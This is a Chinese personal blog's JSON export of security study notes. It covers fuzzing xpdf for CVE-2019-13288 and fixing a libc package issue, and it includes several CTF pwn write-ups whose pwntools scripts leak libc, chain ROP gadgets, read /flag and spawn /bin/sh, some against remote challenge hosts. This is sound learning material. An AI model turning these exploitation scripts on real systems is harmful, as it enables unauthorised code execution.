{"meta":{"title":"your blog title","subtitle":"","description":"","author":"your name","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"xpdf","slug":"FUZZ/xpdf","date":"2024-11-26T12:58:53.000Z","updated":"2024-11-26T17:22:58.940Z","comments":true,"path":"2024/11/26/FUZZ/xpdf/","link":"","permalink":"http://example.com/2024/11/26/FUZZ/xpdf/","excerpt":"","text":"CVE-2019-13288 搭建xpdf环境 cd $HOME mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/ # 相关依赖 sudo apt install build-essential sudo apt update &amp;&amp; sudo apt install -y build-essential gcc # Download Xpdf 3.02 &amp;&amp; build Xpdf wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz tar -xvzf xpdf-3.02.tar.gz cd xpdf-3.02 ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot; make make install # Download PDF examples to test Xpdf cd $HOME/fuzzing_xpdf mkdir pdf_examples &amp;&amp; cd pdf_examples wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf wget http://www.africau.edu/images/default/sample.pdf wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf 测试Xpdf $HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf 搭建fuzz环境 sudo apt-get update sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev # try to install llvm 14 and install the distro default if that fails sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#39;s/\\..*//&#39;|sed &#39;s/.* //&#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#39;s/\\..*//&#39;|sed &#39;s/.* //&#39;)-dev sudo apt-get install -y ninja-build # for QEMU mode sudo apt-get install -y cpio libcapstone-dev # for Nyx mode sudo apt-get install -y wget curl # for Frida mode sudo apt-get install -y python3-pip # for Unicorn mode git clone https://github.com/AFLplusplus/AFLplusplus cd AFLplusplus make distrib sudo make install #将afl添加到环境变量path中 echo &#39;export PATH=$PATH:/home/hpp/AFLplusplus&#39; &gt;&gt; ~/.bashrc source ~/.bashrc 使用afl-clang-fast对Xpdf进行插桩 先清理掉之前Xpdf编译好的文件 rm -r $HOME/fuzzing_xpdf/install cd $HOME/fuzzing_xpdf/xpdf-3.02/ make clean 编译xpdf并用 afl-clang-fast 编译器，进行插桩 export LLVM_CONFIG=&quot;llvm-config-11&quot; CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot; make make install 开始fuzz模糊测试 -i :设置输入实例的文件夹 -o :设置用于存放模糊测试结果的文件夹 -s :设置一个静态随机数作为种子 — ：设置测试目标 @@ ：占位符，指代每一个输入文件 afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdftotext @@ $HOME/fuzzing_xpdf/output 在 ~/fuzzing_xpdf/out/default/crashes 里有导致程序奔溃的输入 hpp@swikar:~/fuzzing_xpdf/out/default/crashes$ ls id:000000,sig:11,src:001045,time:342537,execs:245377,op:havoc,rep:15 id:000001,sig:11,src:000229,time:505563,execs:344967,op:havoc,rep:2 id:000002,sig:11,src:001638,time:566771,execs:383537,op:havoc,rep:1 id:000003,sig:11,src:001753+000851,time:820662,execs:526503,op:splice,rep:2 README.txt 将这些文件放到gdb中调试，看看是哪里出错 首先重新编译 rm -r $HOME/fuzzing_xpdf/install cd $HOME/fuzzing_xpdf/xpdf-3.02/ make clean CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot; make make install 然后gdb调试 gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; $HOME/fuzzing_xpdf/output 我这里是 gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001045,time:342537,execs:245377,op:havoc,rep:15 $HOME/fuzzing_xpdf/output pwndbg&gt; run #回溯用过的函数 pwndbg&gt; bt #24055 0x00005555555ff8f0 in Parser::makeStream (this=0x5555561b1030, dict=0x7fffffa71880, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:156 #24056 0x00005555555ff51a in Parser::getObj (this=0x5555561b1030, obj=0x7fffffa71880, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94 #24057 0x0000555555623714 in XRef::fetch (this=0x5555556cc230, num=7, gen=0, obj=0x7fffffa71880) at XRef.cc:823 #24058 0x00005555555fa57e in Object::fetch (this=0x5555561b0c58, xref=0x5555556cc230, obj=0x7fffffa71880) at Object.cc:106 #24059 0x000055555559c94c in Dict::lookup (this=0x5555561b0c00, key=0x55555564ca6f &quot;Length&quot;, obj=0x7fffffa71880) at Dict.cc:76 #24060 0x00005555555fb269 in Object::dictLookup (this=0x7fffffa71b00, key=0x55555564ca6f &quot;Length&quot;, obj=0x7fffffa71880) at /home/hpp/fuzzing_xpdf/xpdf-3.02/xpdf/Object.h:253 #24061 0x00005555555ff8f0 in Parser::makeStream (this=0x5555561b0b50, dict=0x7fffffa71b00, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:156 #24062 0x00005555555ff51a in Parser::getObj (this=0x5555561b0b50, obj=0x7fffffa71b00, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94 # 发现一直在调用Parser::getObj 函数 查看Parser.cc:94的源码 while (!buf1.isCmd(&quot;&gt;&gt;&quot;) &amp;&amp; !buf1.isEOF()) &#123; if (!buf1.isName()) &#123; error(getPos(), &quot;Dictionary key must be a name object&quot;); shift(); &#125; else &#123; key = copyString(buf1.getName()); shift(); if (buf1.isEOF() || buf1.isError()) &#123; gfree(key); break; &#125; //不断调用getObj使程序奔溃 obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength, objNum, objGen)); &#125; &#125; 定位到这 由于本人代码能力一般，修复不了bug,通过chatgpt修复了一下 在源码的基础上增加了一个次数的限制 //定义两个全局变量 #define MAX_OBJ_CALLS 10000 int callCount = 0; while (!buf1.isCmd(&quot;&gt;&gt;&quot;) &amp;&amp; !buf1.isEOF()) &#123; if (!buf1.isName()) &#123; error(getPos(), &quot;Dictionary key must be a name object&quot;); shift(); &#125; else &#123; key = copyString(buf1.getName()); shift(); if (buf1.isEOF() || buf1.isError()) &#123; gfree(key); break; &#125; // 增加调用次数限制 if (callCount &gt;= MAX_OBJ_CALLS) &#123; error(getPos(), &quot;Too many calls to getObj, possible infinite loop&quot;); gfree(key); obj-&gt;initError(); // 初始化为错误对象 break; &#125; callCount++; // 增加调用次数 obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength, objNum, objGen)); &#125; &#125; 这样可以有效限制调用次数 再次make clean,重新插桩编译，因为输入而导致程序奔溃的bug已经没有了，但是跑了很久发现了另外一个……有空再看看吧 这是xpdf4.02中Parser.cc的部分源码 // 增加了递归的上限 // Max number of nested objects. This is used to catch infinite loops // in the object structure. #define recursionLimit 500 // 增加了递归次数的检查 // array if (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(&quot;[&quot;)) &#123; ... // dictionary or stream &#125; else if (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(&quot;&lt;&lt;&quot;)) &#123; ... // 对比之前版本，发现多了 recursion 这个参数 // stream objects are not allowed inside content streams or // object streams if (allowStreams &amp;&amp; buf2.isCmd(&quot;stream&quot;)) &#123; if ((str = makeStream(obj, fileKey, encAlgorithm, keyLength, objNum, objGen, recursion + 1))) &#123; ... 漏洞来源 在 Xpdf 4.01.01 中，Parser.cc 文件中的 Parser::getObj() 函数可能通过精心构造的文件导致无限递归。远程攻击者可以利用此漏洞发动拒绝服务（DoS）攻击。此漏洞与 CVE-2018-16646 类似。 参考文献[1]:Fuzzing101学习笔记 - 星盟安全团队 [2]:Fuzzing101/Exercise 1 at main · antonio-morales/Fuzzing101 [3]:CVE-2019-13288 : In Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite r","categories":[],"tags":[]},{"title":"trick","slug":"trick","date":"2024-11-20T14:03:02.000Z","updated":"2024-11-20T14:54:04.451Z","comments":true,"path":"2024/11/20/trick/","link":"","permalink":"http://example.com/2024/11/20/trick/","excerpt":"","text":"ctfshow 单身杯Findyourgirlfriendstrstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1 输入的s不能包含这些字符串，然后输入的s是 set -s, 最后执行的是system(‘/bin/sh -c set -s),在sh内执行set -s,设置了shell输出选项而没有其他动作 这里不能直接cat，因为远程环境没有给cat设置环境变量$PATH from pwn import* from LibcSearcher import * #p=remote(&quot;pwn.challenge.ctf.show&quot;,28147) p=process(&quot;./girl&quot;) context.log_level=&quot;debug&quot; def dbg(): gdb.attach(p) sleep(1) p.sendlineafter(&#39;games&#39;,&#39;1&#39;) payload=b&#39;set -s&#39; p.sendlineafter(&#39;girlfriend? &#39;,payload) p.sendline(&#39;/bin/cat /flag&#39;) p.interactive() CheckIn保护全开，有个后门函数 rax在栈上 这里用了vsyscall，在这里x64这是固定的地址 设计这玩意的初衷是限制了只有从vsyscall函数入口才能正常运行，避免gadget，这里是反复调用vsyscall不断调用ret破坏栈，具体调试不出来，直接报错了，只有栈上有.text段没清理干净，修改最低位就劫持了控制流 from pwn import* from LibcSearcher import * #p=remote(&quot;pwn.challenge.ctf.show&quot;,28149) p=process(&quot;./1&quot;) context.log_level=&quot;debug&quot; ret=0xffffffffff600000 gdb.attach(p) pause() p.send(p64(ret)*30+b&#39;\\x13&#39;) p.sendline(&#39;/bin/sh&#39;) p.interactive()","categories":[],"tags":[]},{"title":"trick","slug":"trick/trick","date":"2024-11-20T14:03:02.000Z","updated":"2024-11-20T14:54:04.451Z","comments":true,"path":"2024/11/20/trick/trick/","link":"","permalink":"http://example.com/2024/11/20/trick/trick/","excerpt":"","text":"ctfshow 单身杯Findyourgirlfriendstrstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1 输入的s不能包含这些字符串，然后输入的s是 set -s, 最后执行的是system(‘/bin/sh -c set -s),在sh内执行set -s,设置了shell输出选项而没有其他动作 这里不能直接cat，因为远程环境没有给cat设置环境变量$PATH from pwn import* from LibcSearcher import * #p=remote(&quot;pwn.challenge.ctf.show&quot;,28147) p=process(&quot;./girl&quot;) context.log_level=&quot;debug&quot; def dbg(): gdb.attach(p) sleep(1) p.sendlineafter(&#39;games&#39;,&#39;1&#39;) payload=b&#39;set -s&#39; p.sendlineafter(&#39;girlfriend? &#39;,payload) p.sendline(&#39;/bin/cat /flag&#39;) p.interactive() CheckIn保护全开，有个后门函数 rax在栈上 这里用了vsyscall，在这里x64这是固定的地址 设计这玩意的初衷是限制了只有从vsyscall函数入口才能正常运行，避免gadget，这里是反复调用vsyscall不断调用ret破坏栈，具体调试不出来，直接报错了，只有栈上有.text段没清理干净，修改最低位就劫持了控制流 from pwn import* from LibcSearcher import * #p=remote(&quot;pwn.challenge.ctf.show&quot;,28149) p=process(&quot;./1&quot;) context.log_level=&quot;debug&quot; ret=0xffffffffff600000 gdb.attach(p) pause() p.send(p64(ret)*30+b&#39;\\x13&#39;) p.sendline(&#39;/bin/sh&#39;) p.interactive()","categories":[],"tags":[]},{"title":"qwnt2024","slug":"qwnt2024","date":"2024-11-18T14:56:02.000Z","updated":"2024-11-25T16:23:09.834Z","comments":true,"path":"2024/11/18/qwnt2024/","link":"","permalink":"http://example.com/2024/11/18/qwnt2024/","excerpt":"","text":"sigin开了随机种子，输入要和随机数一样 由于buf和seed在栈上，所以可以利用输入buf把seed给覆盖掉 使用 libc=cdll.LoadLibrary(“./libc.so.6”) ，加载的就是特定的libc，然后利用libc的函数libc.srand(seed),得到的随机数和rand一样，后续就是用老套的orw就能解决，不过要栈迁移取去bss段上执行，因为在栈上的rop长度不够 from pwn import* from ctypes import * from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./vuln&quot;) context.log_level=&quot;debug&quot; elf=ELF(&#39;./vuln&#39;) context(arch=&#39;amd64&#39;) #libc=ELF(&#39;/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#39;) libc=cdll.LoadLibrary(&quot;./libc.so.6&quot;) # def dbg(): gdb.attach(p) pause() p.send(b&#39;a&#39;*14+p32(1)) libc.srand(1) menu=0x4014E6 for i in range(100): k=libc.rand()%100+1 print(k) p.sendafter(&#39;code:&#39;,p8(k)) pop_rdi=0x401893 p.sendafter(&#39;&gt;&gt;&#39;,p32(1)) p.sendlineafter(&#39;Index: &#39;,p32(0)) payload=b&#39;a&#39;*0x108+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(menu) libc=ELF(&#39;/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#39;) p.sendlineafter(&#39;Note: &#39;,payload) puts=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) base=puts-libc.sym[&#39;puts&#39;] pop_rsi=0x202f8+base pop_rdx=0x1b92+base read=base+libc.sym[&#39;read&#39;] op=base+libc.sym[&#39;open&#39;] write=base+libc.sym[&#39;write&#39;] bss=0x4040A0 leave=0x401591 p.sendafter(&#39;Index: &#39;,p32(2)) print(hex(op)) payload=b&#39;b&#39;*0x108+p64(pop_rsi)+p64(bss)+p64(read)+p64(menu) p.sendlineafter(&#39;Note: &#39;,&#39;asdf&#39;) p.sendline(payload) p.sendline(&#39;./flag\\x00&#39;) p.sendlineafter(&#39;Index: &#39;,p32(2)) payload=b&#39;a&#39;*0x108+p64(pop_rsi)+p64(bss+0x200)+p64(read)+p64(menu) p.sendlineafter(&#39;Note: &#39;,payload) #orw payload=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(op) payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x200)+p64(pop_rdx)+p64(0x40)+p64(read) payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x200)+p64(pop_rdx)+p64(0x40)+p64(write) p.sendline(payload) dbg() p.sendlineafter(&#39;Index: &#39;,p32(3)) payload=b&#39;d&#39;*0xff+p64(bss+0x200-8)+p64(leave) p.sendafter(&#39;Note: &#39;,&#39;g&#39;*0x100) p.sendline(payload) print(hex(puts)) #leak_base #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"沙箱","slug":"沙箱/沙箱","date":"2024-11-13T13:48:38.000Z","updated":"2024-11-16T12:12:29.050Z","comments":true,"path":"2024/11/13/沙箱/沙箱/","link":"","permalink":"http://example.com/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/","excerpt":"","text":"目前对沙箱类型的题写一下，这块比较薄弱 最常见的就是ret2syscall了，一般开了沙箱，只能用orw ret2syscall一般开了，禁用了execve,只能用orw读出flag 来看下常用的几个函数，当把bin/sh或./flag读入bss时，read（0，bss,nb)，rdi=0，rsi=bss,rsi=nb; 然后时open函数,open(‘flag’), rdi=flag_addr(bss),rsi=0; 读进bss+0x300,read(3,bss+0x300,nb),rdi=3,rsi=bss+0x300,rsi=nb; 读出flag ，write(1,bss+0x300,nb), rdi=1,rsi=bss+0x300,rsi=nb; 遇过一次坑就是，当把flag字符写进bss时，字符串应该时p.sendline(‘./flag\\x00’),后面必须是空格，否则open函数是以加了\\n来找flag文件，是找不到的，所以得加空格 常用的exp from pwn import* from LibcSearcher import * #p=remote(&quot;27.25.151.12&quot;,33424) p=process(&quot;./ret2orw&quot;) elf=ELF(&#39;ret2orw&#39;) #libc=ELF(&#39;libc.so.6&#39;) libc=ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;) context.log_level=&quot;debug&quot; pop_rdi=0x4012CE payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(0x4012A1) #sleep(1) p.sendlineafter(&#39;this?&#39;,payload) puts=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) print(hex(puts)) base=puts-libc.sym[&#39;puts&#39;] def dbg(): gdb.attach(p) pause() pop_rsi=base+0x2be51 pop_rdx=base+0x11f497 bss=0x404060 read=base+libc.sym[&#39;read&#39;] write=base+libc.sym[&#39;write&#39;] op=base+libc.sym[&#39;open&#39;] print(&#39;read&#39;+hex(read)) payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(8)+p64(0)+p64(read)+p64(0x4012A1) p.sendline(payload) p.sendline(&#39;./flag&#39;) dbg() payload=b&#39;a&#39;*0x28+p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(op)+p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x300)+p64(pop_rdx)+p64(60)+p64(0)+p64(read)+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x300)+p64(pop_rdx)+p64(60)+p64(0)+p64(write) p.sendline(payload) print(&#39;pop_rsi&#39;+hex(pop_rsi)) p.interactive()","categories":[],"tags":[]},{"title":"200~house_of_force","slug":"house-of-force","date":"2024-11-03T10:14:32.000Z","updated":"2024-11-04T14:32:48.996Z","comments":true,"path":"2024/11/03/house-of-force/","link":"","permalink":"http://example.com/2024/11/03/house-of-force/","excerpt":"","text":"利用条件：能控制topchunk_size，能够自由控制申请的堆块大小。需要知道top_chunk地址与目的地址的偏移量，如果还不对齐，即结果不是0x0结尾，需要多减8，然后减去SIZE_SZ（8） 结果：能将topcunk的地址控制到我们想要的地址，再申请内存就可以控制这个地址的值。 check1对topchunk_size的检查，(unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE) // 获取当前的top chunk，并计算其对应的大小 victim = av-&gt;top; size = chunksize(victim); // 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。 if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) &#123; remainder_size = size - nb; remainder = chunk_at_offset(victim, nb); av-&gt;top = remainder; #设置top_chunk的头，附近值会有所变化 set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); set_head(remainder, remainder_size | PREV_INUSE); check_malloced_chunk(av, victim, nb); void *p = chunk2mem(victim); alloc_perturb(p, bytes); return p; &#125; 所以把size改为-1，在补码中为很大的数，能够满足条件 新的remainder即top_chunk的地址 **remainder = chunk_at_offset(victim, nb);**，需要算出topchunk的地址和目标地址的偏移check2对申请的size的检查 /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #这里的req即是nb.对req的大小的检查，((unsigned long) (req)要小于 (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 # 对nb加 SIZE_SZ加 MALLOC_ALIGN_MASK,最后和MALLOC_ALIGN_MASK按位与对齐,这里的SIZE_SZ是8 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ # req不能大于 -2 * MINSIZE，否则会报错 #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) &#123; \\ __set_errno(ENOMEM); \\ return 0; \\ &#125; \\ (sz) = request2size(req); 首先 ((unsigned long) (req) &lt;= (unsigned long) (INTERNAL_SIZE_T)(-2 MINSIZE))，即无符号的nb要小于无符号的 **-2 MINSIZE，即req不能大于-2MINSIZE*，一般都能满足条件。其次是对req的对齐的检查，req需要是0x0结尾来对齐，否则得多减8((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)，这里的结果是最后申请的大小。由于(req) + SIZE_SZ，SIZE_SZ是8，所以算出偏移后还需要减去8，虽然req会加上MALLOC_ALIGN_MASK，但是最后会被对齐掉，就不用多减掉MALLOC_ALIGN_MASK了MALLOC_ALIGN 通常指的是内存块对齐的要求。如果req不对齐，不是0x0结尾的，需要多减掉8 bcloud_bctf_2016只开了栈上的保护 这里会把堆的地址给到v2的指针，后续会打印出来 🐕Ⅷ题目，调试的时候完全不是题目逻辑，算了。","categories":[],"tags":[]},{"title":"","slug":"pwn2 short","date":"2024-10-29T09:09:11.391Z","updated":"2024-10-29T09:09:11.572Z","comments":true,"path":"2024/10/29/pwn2 short/","link":"","permalink":"http://example.com/2024/10/29/pwn2%20short/","excerpt":"","text":"pwn2 short很简单的32位栈迁移，还留了个后门 这里获得栈地址 把bin/sh的地址放返回地址后面就ok from pwn import* from LibcSearcher import * p=remote(&quot;0192d5ebf7187dfe967b1c88a2bb1480.3sya.dg02.ciihw.cn&quot;,43744) #p=process(&quot;./short&quot;) context.log_level=&quot;debug&quot; p.sendlineafter(&#39;username: &#39;,&#39;admin&#39;) p.sendlineafter(&#39;password: &#39;,&#39;admin123&#39;) p.recvuntil(&#39;0x&#39;) stack=int(p.recv(8),16) print(hex(stack)) pop_edi=0x0804884a pop_ebx=0x08048411 gift=0x080485E6 leave=0x08048674 binsh=0x0804A038 payload=p32(gift)+p32(0)+p32(binsh)+b&#39;a&#39;*68+p32(stack-4)+p32(leave) #gdb.attach(p) sleep(1) p.sendlineafter(&quot;msg:&quot;,payload) p.interactive()","categories":[],"tags":[]},{"title":"overlapping_chunks","slug":"overlapping_chunks","date":"2024-10-21T12:11:58.000Z","updated":"2024-10-21T14:20:21.671Z","comments":true,"path":"2024/10/21/overlapping_chunks/","link":"","permalink":"http://example.com/2024/10/21/overlapping_chunks/","excerpt":"","text":"大多都是堆溢出的情况下，chunk释放前或释放后改变size的值，再申请的时候造成两个堆块有重合的地方，有时候需要改变对应下一个堆的pre_size绕过检查，虽说在libc2.29以后才出现，但有时候2.23的版本还是会因此而报错。所以尽可能的在下一个chunk的pre_size位改成我们的size. /* consolidate backward */ if (!prev_inuse(p)) &#123; prevsize = prev_size (p); size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); /* 后两行代码在最新版本中加入，则 2 的第二种方法无法使用，但是 2.28 及之前都没有问题 */ if (__glibc_unlikely (chunksize(p) != prevsize)) malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;); unlink_chunk (av, p); &#125; 2015 hacklu bookstore该程序是动态链接的 64 位程序，主要开启了 Canary 与 NX 保护. 程序的最后有个格式化字符串漏洞，只能用一次，用于泄露libc和在fini的地方写上main函数地址 这里输入s是能写上栈的地方，这里输入fini的地址 算出偏移是13 这里只强调构造的fake_chunk payload=b&#39;%2828c%13$hnkk%31$p&#39; payload=payload.ljust(0x88,b&#39;b&#39;) payload+=p64(0x151) payload=payload.ljust(0x1d0,b&#39;\\x41&#39;)+p64(0x150)+p64(0x41)+p64(0)*6+p64(0x40)+p64(0x31) 申请堆的过程中有堆溢出可以更改下一个 堆的size，改成下面特殊的堆的size，根据题目给大小改。","categories":[],"tags":[]},{"title":"heapcreator","slug":"heapcreator","date":"2024-10-17T08:03:43.000Z","updated":"2024-10-17T08:03:43.032Z","comments":true,"path":"2024/10/17/heapcreator/","link":"","permalink":"http://example.com/2024/10/17/heapcreator/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"stdout","slug":"stdout","date":"2024-09-21T14:44:34.000Z","updated":"2024-09-22T13:51:20.983Z","comments":true,"path":"2024/09/21/stdout/","link":"","permalink":"http://example.com/2024/09/21/stdout/","excerpt":"","text":"这里stdout第三个参数是0，就是标准输出全缓冲，缓冲区被填满才能进行回显 刷新缓冲区有几种办法 能够溢出8字节 一个没什么用的函数 那么只能将缓冲区填满，刚开始想的是用vuln函数不断输入 ret的操作是pop rip，rsp=rsp+8, 指向0x0x7fff153a5588. endbr64指令rsp是不动的，push rbp后rbp变成了原来返回地址的位置,再次调用相同的输入也只是让rbp+8,即每次 for i in range(20): payload=b&#39;c&#39;*0x28+p64(vul) p.send(payload) print(i) 也只是让rbp+8移动 第二次的rbp 只是调用vuln的话时不会回显的。 其实不是理想当然的填充，得调用extend函数填充缓冲区。那么就只能不断调用extend函数把缓冲区填满。 调用extend时第二十次时的栈 exp from pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./pwn&quot;) context.log_level=&quot;debug&quot; elf=ELF(&#39;./pwn&#39;) libc=ELF(&#39;./libc-2.31.so&#39;) extend=0x401287 vul=0x40125D pop_rdi=0x4013d3 puts_got=elf.got[&#39;puts&#39;] puts=elf.plt[&#39;puts&#39;] payload=b&#39;a&#39;*0x58+p64(vul) p.send(payload) payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(extend)+p64(vul) p.send(payload) for i in range(21): payload=b&#39;c&#39;*0x28+p64(extend)+p64(vul) p.send(payload) p.recvuntil(&#39;stdout???&#39;) p.recvline() puts_addr=u64(p.recv(6).ljust(8,b&#39;\\x00&#39;)) base=puts_addr-0x10dfc0 #libc.sym[&#39;puts&#39;] system=base+libc.sym[&#39;system&#39;] binsh=base+next(libc.search(b&#39;bin/sh&#39;)) gdb.attach(p) pause() payload=b&#39;b&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(system) p.send(payload) print(hex(libc.sym[&#39;puts&#39;])) print(&#39;put&#39;+hex(puts_addr)) p.interactive()","categories":[],"tags":[]},{"title":"解决libc6软件包和libc6-dev不匹配的问题","slug":"解决libc6软件包和libc6-dev不匹配的问题","date":"2024-09-18T12:27:44.000Z","updated":"2024-09-19T13:03:57.427Z","comments":true,"path":"2024/09/18/解决libc6软件包和libc6-dev不匹配的问题/","link":"","permalink":"http://example.com/2024/09/18/%E8%A7%A3%E5%86%B3libc6%E8%BD%AF%E4%BB%B6%E5%8C%85%E5%92%8Clibc6-dev%E4%B8%8D%E5%8C%B9%E9%85%8D%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"之前在学vm内核调试的时候，不小心把libc6-dev之类的包给删掉了，导致后面gcc编译不了，重新下载libc6-dev时，会弹出这样的报错，这种报错之前很常见。 下列软件包有未满足的依赖关系： libc6-dev : 依赖: libc6 (= 2.27-3ubuntu1.6) 但是 2.35-0ubuntu3 正要被安装 依赖: libc-dev-bin (= 2.27-3ubuntu1.6) E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。 最本质的原因就是已安装的libc6版本是2.35-0ubuntu3，但是要安装的libc6-dev所要的依赖是libc6和libc-dev-bin的版本都是2.27,当初想过把libc6降级的，因为libc6是软件包，有很多依赖关系，结果系统奔溃了，还刚好没提前拍快照，只有很久之前的。 libc6就是一个软件包名称，包含c标准库的所有功能，包含有很多库文件，如libc.so.6，是底层代码如prinf函数的实现。通常存放在/lib目录下，系统核心库的存放目录。 libc6-dev含有很多c标准库，如stdio.h,math.h.包含很多头文件。解压放到/usr/include/。 /usr/lib 目录是用户级库的存放目录，这些库文件是用户安装的软件包所需的，例如图形库、数据库库、开发库等。这些库文件通常是用户安装的软件包所需的，而不是系统核心组件所需的。 最正确的办法就是下载对应版本的libc6-dev.deb解压，要和已安装的libc6版本匹配，当时是直接找了网站glibc库 下载libc6-dev.deb，但是找不到2.35版本的，后面终于在package.ubuntu.com找到,点这两个下载 https://packages.ubuntu.com/jammy/libc6-dev 解压到/tmp/libc6-dev mkdir /tmp/libc6-dev dpkg-deb -x libc6-dev_2.35-0ubuntu3.8_amd64.deb /tmp/libc6-dev sudo rsync -av /tmp/libc6-dev/usr/include/ /usr/include/ #移动头文件 sudo rsync -av /tmp/libc6-dev/usr/share/ /usr/share/ #移动共享数据文件 sudo rsync -av /tmp/libc6-dev/usr/lib/ /usr/lib/ #移动用户级库文件，这里有一个小点。 同理，libc-dev-bin也解压 mkdir /tmp/libc-dev-bin dpkg-deb -x libc-dev-bin_2.35-0ubuntu3.8_amd64.deb /tmp/libc-dev-bin sudo rsync -av /tmp/libc-dev-bin/usr/ /usr/ #主要是一些工具脚本 后面把tmp目录下的这两个临时文件删了就好。 后面我试着gcc编译的时候，还是遇见了个老错误 gcc 1.c -o 1 /usr/bin/ld: 找不到 Scrt1.o: 没有那个文件或目录 /usr/bin/ld: 找不到 crti.o: 没有那个文件或目录 collect2: error: ld returned 1 exit status 通过查找发现，它在/tmp/libc6-dev/usr/lib/x86_64-linux-gnu 这个目录里，这个正是库文件的位置，把这些库文件移动到/usr/lib/x86_64-linux-gnu/目录就好 